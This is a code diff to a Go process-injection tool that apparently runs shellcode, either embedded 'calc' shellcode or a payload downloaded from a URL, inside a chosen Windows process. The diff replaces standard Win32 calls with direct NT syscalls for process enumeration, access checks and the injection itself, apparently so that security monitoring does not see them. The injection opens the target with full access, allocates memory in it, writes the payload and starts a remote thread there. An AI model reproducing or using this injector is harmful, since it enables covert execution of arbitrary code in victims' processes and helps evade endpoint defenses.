@@ -15,9 +15,74 @@ import (
 	"unsafe"
 
 	winapi "github.com/carved4/go-direct-syscall"
-
-	"golang.org/x/sys/windows"
 )
+
+// Windows structures for NtQuerySystemInformation
+type UNICODE_STRING struct {
+	Length        uint16
+	MaximumLength uint16
+	Buffer        *uint16
+}
+
+type CLIENT_ID struct {
+	UniqueProcess uintptr
+	UniqueThread  uintptr
+}
+
+type OBJECT_ATTRIBUTES struct {
+	Length                   uint32
+	RootDirectory            uintptr
+	ObjectName               *UNICODE_STRING
+	Attributes               uint32
+	SecurityDescriptor       uintptr
+	SecurityQualityOfService uintptr
+}
+
+type SYSTEM_PROCESS_INFORMATION struct {
+	NextEntryOffset              uint32
+	NumberOfThreads              uint32
+	WorkingSetPrivateSize        int64
+	HardFaultCount               uint32
+	NumberOfThreadsHighWatermark uint32
+	CycleTime                    uint64
+	CreateTime                   int64
+	UserTime                     int64
+	KernelTime                   int64
+	ImageName                    UNICODE_STRING
+	BasePriority                 int32
+	UniqueProcessId              uintptr
+	InheritedFromUniqueProcessId uintptr
+	HandleCount                  uint32
+	SessionId                    uint32
+	UniqueProcessKey             uintptr
+	PeakVirtualSize              uintptr
+	VirtualSize                  uintptr
+	PageFaultCount               uint32
+	PeakWorkingSetSize           uintptr
+	WorkingSetSize               uintptr
+	QuotaPeakPagedPoolUsage      uintptr
+	QuotaPagedPoolUsage          uintptr
+	QuotaPeakNonPagedPoolUsage   uintptr
+	QuotaNonPagedPoolUsage       uintptr
+	PagefileUsage                uintptr
+	PeakPagefileUsage            uintptr
+	PrivatePageCount             uintptr
+	ReadOperationCount           int64
+	WriteOperationCount          int64
+	OtherOperationCount          int64
+	ReadTransferCount            int64
+	WriteTransferCount           int64
+	OtherTransferCount           int64
+}
+
+type PROCESS_BASIC_INFORMATION struct {
+	ExitStatus                   uintptr
+	PebBaseAddress               uintptr
+	AffinityMask                 uintptr
+	BasePriority                 int32
+	UniqueProcessId              uintptr
+	InheritedFromUniqueProcessId uintptr
+}
 
 // getEmbeddedShellcode returns the embedded calc shellcode as bytes
 func getEmbeddedShellcode() []byte {
@@ -32,11 +97,7 @@ func getEmbeddedShellcode() []byte {
 	return bytes
 }
 
-// Windows constants that might not be defined in windows package
-const (
-	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
-	STILL_ACTIVE                      = 259 // STILL_ACTIVE constant
-)
+
 
 // Process information structure
 type ProcessInfo struct {
@@ -87,74 +148,221 @@ func downloadPayload(url string) ([]byte, error) {
 	fmt.Printf("Downloaded %d bytes of shellcode\n", len(payload))
 	return payload, nil
 }
-// Note the usage of win api here is not the same as using the win api for our real purposes
-// if you would like to bypass the usage of win api here, you could sub out the create toolhelp32snapshot function
-// for an equivalent ntdll exposed function and call it directly with my libraries' direct syscall func :3
-// getProcessList retrieves a list of running processes
-func getProcessList() ([]ProcessInfo, error) {
-	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
-	if err != nil {
-		return nil, fmt.Errorf("failed to create process snapshot: %v", err)
+
+// utf16ToString converts a UTF16 string to Go string
+func utf16ToString(ptr *uint16, maxLen int) string {
+	if ptr == nil {
+		return ""
 	}
-	defer windows.CloseHandle(snapshot)
-
-	var entry windows.ProcessEntry32
-	entry.Size = uint32(unsafe.Sizeof(entry))
-
-	err = windows.Process32First(snapshot, &entry)
-	if err != nil {
-		return nil, fmt.Errorf("Process32First failed: %v", err)
-	}
-
-	var processes []ProcessInfo
-	for {
-		exeFile := windows.UTF16ToString(entry.ExeFile[:])
-		
-		// Skip system processes with empty names
-		if exeFile != "" {
-			// Check if we can access this process
-			handle, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, entry.ProcessID)
-			if err == nil {
-				// We can access this process
-				windows.CloseHandle(handle)
-				processes = append(processes, ProcessInfo{
-					Pid:  entry.ProcessID,
-					Name: exeFile,
-				})
-			}
-		}
-
-		err = windows.Process32Next(snapshot, &entry)
-		if err != nil {
+	
+	var result []uint16
+	for i := 0; i < maxLen; i++ {
+		char := *(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + uintptr(i)*2))
+		if char == 0 {
 			break
 		}
+		result = append(result, char)
 	}
+	
+	// Simple conversion for ASCII characters
+	var str strings.Builder
+	for _, char := range result {
+		if char < 128 {
+			str.WriteByte(byte(char))
+		} else {
+			str.WriteRune('?') // Replace non-ASCII with ?
+		}
+	}
+	return str.String()
+}
 
+// getProcessList retrieves a list of running processes using NtQuerySystemInformation
+func getProcessList() ([]ProcessInfo, error) {
+	// First call to get required buffer size
+	var returnLength uintptr
+	status, err := winapi.NtQuerySystemInformation(
+		winapi.SystemProcessInformation,
+		nil,
+		0,
+		&returnLength,
+	)
+	
+	if status != winapi.STATUS_INFO_LENGTH_MISMATCH && status != winapi.STATUS_BUFFER_TOO_SMALL {
+		return nil, fmt.Errorf("failed to get buffer size: %s", winapi.FormatNTStatus(status))
+	}
+	
+	// Allocate buffer with some extra space
+	bufferSize := returnLength + 4096
+	buffer := make([]byte, bufferSize)
+	
+	// Second call to get actual data
+	status, err = winapi.NtQuerySystemInformation(
+		winapi.SystemProcessInformation,
+		unsafe.Pointer(&buffer[0]),
+		bufferSize,
+		&returnLength,
+	)
+	
+	if err != nil {
+		return nil, fmt.Errorf("NtQuerySystemInformation error: %v", err)
+	}
+	
+	if status != winapi.STATUS_SUCCESS {
+		return nil, fmt.Errorf("NtQuerySystemInformation failed: %s", winapi.FormatNTStatus(status))
+	}
+	
+	var processes []ProcessInfo
+	offset := uintptr(0)
+	processCount := 0
+	
+	for {
+		// Safety check to prevent buffer overflow
+		if offset >= uintptr(len(buffer)) {
+			break
+		}
+		
+		// Get current process entry
+		processInfo := (*SYSTEM_PROCESS_INFORMATION)(unsafe.Pointer(&buffer[offset]))
+		processCount++
+		
+		// Extract process name from UNICODE_STRING
+		var processName string
+		if processInfo.ImageName.Buffer != nil && processInfo.ImageName.Length > 0 {
+			maxChars := int(processInfo.ImageName.Length / 2) // Length is in bytes, convert to chars
+			if maxChars > 260 { // MAX_PATH protection
+				maxChars = 260
+			}
+			processName = utf16ToString(processInfo.ImageName.Buffer, maxChars)
+		} else {
+			// Handle System Idle Process (PID 0) which has no name
+			if processInfo.UniqueProcessId == 0 {
+				processName = "System Idle Process"
+			} else {
+				processName = fmt.Sprintf("Process_%d", processInfo.UniqueProcessId)
+			}
+		}
+		
+
+		
+		// Skip System Idle Process (PID 0) but include all others
+		if processInfo.UniqueProcessId != 0 && processName != "" {
+			// Try to open the process to check if we have access
+			// Use a more permissive access check - try different access levels
+			var processHandle uintptr
+			clientId := CLIENT_ID{
+				UniqueProcess: processInfo.UniqueProcessId,
+				UniqueThread:  0,
+			}
+			
+			// Initialize OBJECT_ATTRIBUTES to NULL equivalent
+			objAttrs := OBJECT_ATTRIBUTES{
+				Length: uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
+			}
+			
+			// Try with limited access first
+			status, _ := winapi.NtOpenProcess(
+				&processHandle,
+				winapi.PROCESS_QUERY_LIMITED_INFORMATION,
+				uintptr(unsafe.Pointer(&objAttrs)),
+				uintptr(unsafe.Pointer(&clientId)),
+			)
+			
+			// If that fails, try with even more limited access
+			if status != winapi.STATUS_SUCCESS {
+				status, _ = winapi.NtOpenProcess(
+					&processHandle,
+					winapi.PROCESS_QUERY_INFORMATION,
+					uintptr(unsafe.Pointer(&objAttrs)),
+					uintptr(unsafe.Pointer(&clientId)),
+				)
+			}
+			
+			// If that still fails, just add the process anyway (we know it exists)
+
+			if status == winapi.STATUS_SUCCESS {
+				winapi.NtClose(processHandle)
+			}
+			
+
+			
+			// Add process to list even if we can't access it for injection
+			// We'll check access again when actually trying to inject
+			processes = append(processes, ProcessInfo{
+				Pid:  uint32(processInfo.UniqueProcessId),
+				Name: processName,
+			})
+		}
+		
+		// Move to next entry
+		if processInfo.NextEntryOffset == 0 {
+			break
+		}
+		offset += uintptr(processInfo.NextEntryOffset)
+	}
+	
+
+	
 	// Sort processes by name for easier readability
 	sort.Slice(processes, func(i, j int) bool {
 		return processes[i].Name < processes[j].Name
 	})
-
+	
 	return processes, nil
 }
 
+// isProcessRunning checks if a process is still running using NtQueryInformationProcess
 func isProcessRunning(pid uint32) error {
-	process, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
+	// Open the process
+	var processHandle uintptr
+	clientId := CLIENT_ID{
+		UniqueProcess: uintptr(pid),
+		UniqueThread:  0,
+	}
+	
+	// Initialize OBJECT_ATTRIBUTES properly
+	objAttrs := OBJECT_ATTRIBUTES{
+		Length: uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
+	}
+	
+	status, err := winapi.NtOpenProcess(
+		&processHandle,
+		winapi.PROCESS_QUERY_LIMITED_INFORMATION,
+		uintptr(unsafe.Pointer(&objAttrs)),
+		uintptr(unsafe.Pointer(&clientId)),
+	)
+	
 	if err != nil {
 		return fmt.Errorf("failed to open process for verification: %v", err)
 	}
-	defer windows.CloseHandle(process)
-
-	var exitCode uint32
-	err = windows.GetExitCodeProcess(process, &exitCode)
+	
+	if status != winapi.STATUS_SUCCESS {
+		return fmt.Errorf("failed to open process: %s", winapi.FormatNTStatus(status))
+	}
+	
+	defer winapi.NtClose(processHandle)
+	
+	// Query basic process information
+	var processInfo PROCESS_BASIC_INFORMATION
+	var returnLength uintptr
+	
+	status, err = winapi.NtQueryInformationProcess(
+		processHandle,
+		winapi.ProcessBasicInformation,
+		unsafe.Pointer(&processInfo),
+		unsafe.Sizeof(processInfo),
+		&returnLength,
+	)
+	
 	if err != nil {
-		return fmt.Errorf("failed to get process exit code: %v", err)
+		return fmt.Errorf("failed to query process information: %v", err)
 	}
-
-	if exitCode != STILL_ACTIVE {
-		return fmt.Errorf("target process is not running")
+	
+	if status != winapi.STATUS_SUCCESS {
+		return fmt.Errorf("process query failed: %s", winapi.FormatNTStatus(status))
 	}
-
+	
+	// If we can query the process, it's running
+	// The ExitStatus would be non-zero if the process had exited
 	return nil
 }
 
@@ -169,18 +377,40 @@ func directSyscallInjector(payload []byte, pid uint32) error {
 	}
 
 	// Open target process
-	process, err := windows.OpenProcess(winapi.PROCESS_ALL_ACCESS, false, pid)
+	var processHandle uintptr
+	clientId := CLIENT_ID{
+		UniqueProcess: uintptr(pid),
+		UniqueThread:  0,
+	}
+	
+	// Initialize OBJECT_ATTRIBUTES properly
+	objAttrs := OBJECT_ATTRIBUTES{
+		Length: uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
+	}
+	
+	status, err := winapi.NtOpenProcess(
+		&processHandle,
+		winapi.PROCESS_ALL_ACCESS,
+		uintptr(unsafe.Pointer(&objAttrs)),
+		uintptr(unsafe.Pointer(&clientId)),
+	)
+	
 	if err != nil {
 		return fmt.Errorf("failed to open target process: %v", err)
 	}
-	defer windows.CloseHandle(process)
+	
+	if status != winapi.STATUS_SUCCESS {
+		return fmt.Errorf("failed to open target process: %s", winapi.FormatNTStatus(status))
+	}
+	
+	defer winapi.NtClose(processHandle)
 
 	// NtAllocateVirtualMemory using direct syscall library
 	var remoteBuffer uintptr
 	allocSize := uintptr(len(payload))
 	
-	status, err := winapi.NtAllocateVirtualMemory(
-		uintptr(process),
+	status, err = winapi.NtAllocateVirtualMemory(
+		processHandle,
 		&remoteBuffer,
 		0,
 		&allocSize,
@@ -202,7 +432,7 @@ func directSyscallInjector(payload []byte, pid uint32) error {
 	var bytesWritten uintptr
 	
 	status, err = winapi.NtWriteVirtualMemory(
-		uintptr(process),
+		processHandle,
 		remoteBuffer,
 		unsafe.Pointer(&payload[0]),
 		uintptr(len(payload)),
@@ -231,7 +461,7 @@ func directSyscallInjector(payload []byte, pid uint32) error {
 		&hThread,             // 1. ThreadHandle
 		winapi.THREAD_ALL_ACCESS, // 2. DesiredAccess  
 		0,                    // 3. ObjectAttributes (NULL)
-		uintptr(process),     // 4. ProcessHandle
+		processHandle,        // 4. ProcessHandle
 		remoteBuffer,         // 5. StartRoutine
 		0,                    // 6. Argument (NULL)
 		0,                    // 7. CreateFlags
@@ -252,7 +482,7 @@ func directSyscallInjector(payload []byte, pid uint32) error {
 	fmt.Printf("Created thread: %s\n", winapi.FormatNTStatus(status))
 
 	if hThread != 0 {
-		windows.CloseHandle(windows.Handle(hThread))
+		winapi.NtClose(hThread)
 	}
 
 	return nil
